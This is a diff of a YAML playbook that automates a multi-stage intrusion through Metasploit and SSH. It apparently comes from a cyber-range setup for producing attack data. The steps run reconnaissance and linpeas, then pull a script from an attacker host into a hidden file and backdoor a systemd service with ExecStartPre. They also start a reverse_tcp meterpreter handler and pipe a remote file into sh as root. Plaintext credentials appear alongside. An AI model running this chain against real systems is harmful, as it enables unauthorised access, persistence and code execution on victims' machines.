@@ -1,6 +1,6 @@
 ####################
 #
-# Scenario 1 a a
+# Scenario 1 c a
 #
 ####################
 msf_config:
@@ -24,7 +24,7 @@ commands:
     cmd: dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN
 
   - type: shell
-    cmd: nmap -O -sT --top-ports 100 $SERVER_ADDRESS
+    cmd: sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS
 
   - type: shell
     cmd: "nikto -host $SERVER_ADDRESS"
@@ -82,58 +82,132 @@ commands:
 
   - type: msf-session
     cmd: ./linpeas.sh -s -q -N 2> /dev/null
-    write: True
     session: "foothold"
     end_str: "PWN >"
 
+  # wait a little bit for linpeas
+  - type: sleep
+    seconds: 380
+
+  # This command fixes the outputbuffer
+  # so that the output of the further
+  # commands will work!
   - type: msf-session
-    cmd: wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1
+    read: True
+    cmd: id
     session: "foothold"
-    end_str: "PWN >"
 
   - type: msf-session
-    cmd: chmod +x PwnKit && ./PwnKit
+    cmd: curl http://$ATTACKER_ADDRESS/TODO.md > /var/www/default/.zm_preload.sh
     session: "foothold"
+
+  - type: msf-session
+    cmd: vim /usr/lib/systemd/system/zoneminder.service
+    session: "foothold"
+
+  - type: msf-session
+    cmd: ":inoremap jj <ESC>"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "/[Service"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "o"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "ExecStartPre=bash /var/www/default/.zm_preload.sh &"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "jj"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: ":wq!\n"
+    session: "foothold"
+
+  - type: msf-session
+    cmd: "exit"
+    session: "foothold"
+
+  - type: ssh
+    cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 reboot" | at now + 2 minute
+    hostname: 192.168.100.222
+    username: aecid
+    password: aecid
+    jmp_hostname:  192.42.1.232
+    exit_on_error: False
+
+  - type: msf-module
+    cmd: exploit/multi/handler
+    creates_session: "root"
+    payload_options:
+      LHOST: 192.42.1.174
+    payload: cmd/unix/python/meterpreter/reverse_tcp
+
+  - type: msf-session
+    stdapi: True
+    cmd: "getuid"
+    session: "root"
+
+  - type: msf-session
+    cmd: shell
+    session: "root"
+
+  - type: msf-session
+    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+    session: "root"
+ 
+  - type: msf-session
+    cmd: export SHELL=bash
+    session: "root"
+ 
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+    session: "root"
+ 
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+    session: "root"
 
   - type: msf-session
     cmd: id
-    session: "foothold"
-    end_str: "PWN >"
+    session: "root"
 
   - type: msf-session
-    session: "foothold"
-    cmd: "cd /root; wget http://$ATTACKER_ADDRESS/README.txt"
-    end_str: "PWN >"
+    session: "root"
+    cmd: "curl http://$ATTACKER_ADDRESS/README.txt.1 | sh"
+
+  - type: sleep
+    seconds: 40
 
   - type: msf-session
-    cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
-    session: "foothold"
-    end_str: "PWN >"
+    cmd: id
+    read: True
+    session: "root"
+
+
+# TODO: THIS COMMAND DOES NOT WORK
+#       DON'T KNOW WHY
+#  - type: msf-session
+#    cmd: split --filter="/usr/bin/cat $FILE | /usr/bin/xargs /bin/bash -c " -C 2000 /root/README.txt
+#    session: "root"
+#
 
 #  - type: msf-session
-#    cmd: rm /opt/README.txt
-#    session: "foothold"
-#    end_str: "PWN >"
+#    cmd: rm /root/README.txt
+#    session: "root"
 
   - type: msf-session
     cmd: exit
-    session: "foothold"
-    end_str: "PWN >"
-
-
-  - type: msf-session
-    cmd: rm ./PwnKit
-    session: "foothold"
-    end_str: "PWN >"
-
-  - type: msf-session
-    cmd: rm linpeas.sh
-    session: "foothold"
-    end_str: "PWN >"
+    session: "root"
 
   - type: msf-session
     cmd: exit
-    session: "foothold"
+    session: "root"
 
   - type: sleep
     seconds: 30
@@ -145,6 +219,7 @@ commands:
     username: root
     key_filename: "/home/aecid/.ssh/attacker_key"
     creates_session: "rootshell"
+    clear_cache: True
 
   - type: ssh
     cmd: pwd
@@ -169,23 +244,3 @@ commands:
   - type: ssh
     cmd: find /usr -name \*virtualbox\*
     session: "rootshell"
-
-
-      #
-      #  - type: msf-session
-      #    cmd: sudo -l
-      #
-      #  - type: msf-session
-      #    write: True
-      #    cmd: "sudo dmesg -H"
-      #
-      #  - type: msf-session
-      #    write: True
-      #    cmd: "!/bin/bash\r\n"
-      #
-      #  - type: msf-session
-      #    cmd: id
-      #
-      #  - type: msf-session
-      #    cmd: ls -l /root
-      #
